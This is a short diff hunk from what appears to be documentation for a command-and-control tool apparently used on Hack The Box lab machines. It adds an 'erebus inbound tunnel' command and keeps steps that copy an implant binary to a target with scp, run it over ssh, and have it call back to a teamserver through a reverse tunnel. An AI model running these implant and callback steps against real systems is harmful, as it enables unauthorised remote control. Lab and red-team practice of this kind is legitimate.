@@ -145,7 +145,8 @@ Many boxes (FireFlow, DarkZeroReturns) block outbound to `tun0`. Use reverse tun
 
 ```bash
 # Operator: teamserver HTTPS :8443
-./scripts/htb_reverse_tunnel.sh user@TARGET_IP
+erebus inbound tunnel user@TARGET_IP
+# or: ./scripts/htb_reverse_tunnel.sh user@TARGET_IP
 # Target implant must be built with CALLBACK_URL=https://127.0.0.1:8443
 scp build/implant_c_linux user@TARGET:/tmp/
 ssh user@TARGET 'chmod +x /tmp/implant_c_linux && /tmp/implant_c_linux'
